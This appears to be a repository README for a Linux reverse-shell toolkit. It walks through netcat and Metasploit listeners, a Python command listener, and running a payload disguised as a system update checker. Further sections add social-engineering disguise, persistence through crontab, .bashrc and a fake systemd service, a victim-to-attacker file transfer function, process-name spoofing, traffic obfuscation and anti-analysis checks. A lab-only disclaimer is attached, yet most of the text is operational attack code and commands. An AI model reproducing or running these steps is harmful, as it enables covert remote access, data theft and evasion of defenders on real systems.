# Linux Reverse Shell Setup Guide

## Overview
This directory contains Python scripts for creating reverse shell connections from Ubuntu/Linux systems to your Kali Linux attacker machine. These scripts are designed for educational purposes and penetration testing in controlled lab environments.

## Files in this directory:
- `reverse_shell.py` - Basic reverse shell with PTY support
- `disguised_app.py` - Script disguised as system update checker
- `setup_instructions.md` - This setup guide
- `persistence_techniques.md` - Methods for maintaining access
- `privilege_escalation.md` - Local privilege escalation techniques

## Quick Setup

### Step 1: Configure Network
Ensure both VMs can communicate:
```bash
# On Kali (check your IP)
ip addr show

# On Ubuntu (test connectivity)
ping -c 3 <kali-ip>
```

### Step 2: Configure Python Scripts
Edit the centralized configuration file in the repository root:
```bash
# Navigate to repository root
cd /path/to/reverse-shell-simple-script

# Edit the centralized config
nano config.py

# Update these values:
ATTACKER_IP = "192.168.1.10"  # Your Kali Linux IP
ATTACKER_PORT = 4444          # Port for the connection
```

All scripts will automatically use this configuration.

### Step 3: Set up Listener on Kali

#### Option A: NetCat Listener (Simple)
```bash
# Basic listener
sudo nc -nlvp 4444

# Better listener with proper shell
sudo nc -nlvp 4444 -e /bin/bash
```

#### Option B: Metasploit Handler (Advanced)
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

#### Option C: Custom Python Listener
```python
#!/usr/bin/env python3
import socket

def start_listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[+] Listening on port {port}...")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    
    while True:
        command = input("shell> ")
        if command.lower() == 'exit':
            break
        conn.send(command.encode())
        result = conn.recv(4096).decode()
        print(result)
    
    conn.close()

if __name__ == "__main__":
    start_listener()
```

### Step 4: Execute on Ubuntu VM

#### Method A: Direct execution (from repository root)
```bash
# Navigate to repository root first
cd /path/to/reverse-shell-simple-script

# Make executable
chmod +x src/linux/reverse_shell.py

# Run the script (will automatically import config.py)
python3 src/linux/reverse_shell.py
```

#### Method B: Background execution
```bash
# Run in background (from repository root)
nohup python3 src/linux/disguised_app.py > /dev/null 2>&1 &

# Or use screen/tmux
screen -S update_checker python3 src/linux/disguised_app.py
```

## Testing Process

### 1. Pre-flight checklist:
- [ ] Both VMs are on the same network
- [ ] Firewall allows the connection
- [ ] Correct IP addresses configured
- [ ] Python3 is available on Ubuntu VM

### 2. Test connectivity:
```bash
# From Ubuntu to Kali
telnet <kali-ip> 4444
```

### 3. Start listener on Kali:
```bash
sudo nc -nlvp 4444
```

### 4. Execute payload on Ubuntu:
```bash
python3 reverse_shell.py
```

### 5. Verify connection:
- You should see connection message on Kali
- Try basic commands: `whoami`, `pwd`, `ls`

## Deployment Scenarios

### Scenario 1: Social Engineering
```bash
# Rename script to look legitimate
cp disguised_app.py system_update_check
chmod +x system_update_check

# Execute with convincing context
./system_update_check
```

### Scenario 2: Automated Execution
```bash
# Add to crontab for persistence
echo "*/5 * * * * /usr/bin/python3 /tmp/.system_check.py" | crontab -

# Or add to startup scripts
echo "python3 /home/user/.config/autostart/updater.py &" >> ~/.bashrc
```

### Scenario 3: Service Impersonation
```bash
# Create fake systemd service
sudo tee /etc/systemd/system/system-updater.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/system-updater/updater.py
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable system-updater.service
```

## Advanced Features

### Enhanced Shell Capabilities
```python
# Add to your reverse shell script for better functionality

def enhanced_shell(s):
    """Enhanced shell with additional features"""
    import termios, tty
    
    # Set raw mode for better terminal interaction
    try:
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
        
        # Your shell code here
        
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
```

### File Transfer Capability
```python
def download_file(s, filename):
    """Download file from victim to attacker"""
    try:
        with open(filename, 'rb') as f:
            data = f.read()
            s.send(f"FILE_START:{len(data)}".encode())
            s.send(data)
            s.send(b"FILE_END")
    except Exception as e:
        s.send(f"ERROR:{str(e)}".encode())

def upload_file(s, filename):
    """Upload file from attacker to victim"""
    # Implementation for receiving files
    pass
```

## Evasion Techniques

### 1. Process Hiding
```bash
# Change process name
exec -a "systemd-update" python3 reverse_shell.py

# Or use Python
import os
import sys
os.system(f"exec -a 'systemd-update' {sys.executable} {__file__}")
```

### 2. Traffic Obfuscation
```python
# Add to your script
import base64
import zlib

def obfuscate_data(data):
    """Simple data obfuscation"""
    compressed = zlib.compress(data.encode())
    encoded = base64.b64encode(compressed)
    return encoded

def deobfuscate_data(data):
    """Reverse the obfuscation"""
    decoded = base64.b64decode(data)
    decompressed = zlib.decompress(decoded)
    return decompressed.decode()
```

### 3. Anti-Detection
```python
def check_environment():
    """Basic anti-analysis checks"""
    import psutil
    
    # Check for monitoring processes
    suspicious_processes = ['tcpdump', 'wireshark', 'strace', 'ltrace']
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in suspicious_processes:
            return False
    
    # Check for debugger
    try:
        if os.path.exists('/proc/self/status'):
            with open('/proc/self/status', 'r') as f:
                status = f.read()
                if 'TracerPid:\t0' not in status:
                    return False
    except:
        pass
    
    return True
```

## Troubleshooting

### Common Issues:

#### 1. Connection Refused
```bash
# Check if port is open
sudo netstat -tulpn | grep 4444

# Check firewall
sudo ufw status
sudo iptables -L
```

#### 2. Permission Denied
```bash
# Make script executable
chmod +x reverse_shell.py

# Check Python path
which python3
```

#### 3. Module Import Errors
```bash
# Install required modules
pip3 install psutil  # if using advanced features
```

#### 4. Shell Hangs
```bash
# Use different shell spawning method
# Try bash, sh, or zsh
pty.spawn("/bin/sh")
```

### Debug Mode
Add debugging to your scripts:
```python
import logging
logging.basicConfig(level=logging.DEBUG, filename='/tmp/debug.log')

def debug_connection():
    try:
        # Your connection code
        logging.info("Connection attempt successful")
    except Exception as e:
        logging.error(f"Connection failed: {e}")
```

## Security Considerations

### For the Attacker (Kali):
- Use isolated network environment
- Monitor connections carefully
- Log all activities
- Clean up artifacts after testing

### For the Victim (Ubuntu):
- This is YOUR VM for learning
- Monitor resource usage
- Check for persistence mechanisms
- Practice incident response

## Legal and Ethical Notes

⚠️ **Critical Reminders:**
- Only use on your own systems
- Never deploy on systems without explicit permission
- This is for educational purposes only
- Always follow responsible disclosure
- Document everything for learning purposes

## Next Steps

After mastering basic reverse shells:
1. Study `persistence_techniques.md` for maintaining access
2. Learn `privilege_escalation.md` for gaining higher privileges
3. Practice with different payloads and evasion techniques
4. Set up proper logging and monitoring